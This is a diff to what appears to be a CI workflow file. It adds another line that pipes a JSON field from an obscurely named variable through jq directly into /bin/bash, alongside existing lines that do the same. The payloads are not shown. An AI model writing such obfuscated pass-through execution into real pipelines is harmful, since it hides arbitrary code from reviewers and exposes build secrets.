@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$i46" | jq -r .ykdv904 | /bin/bash
           echo $nzr611 | jq -r .edpm04 | /bin/bash
           echo $c3 | jq -r .sii696 | /bin/bash
+          printf '%s' "$etjsq3" | jq -r .gt4843 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
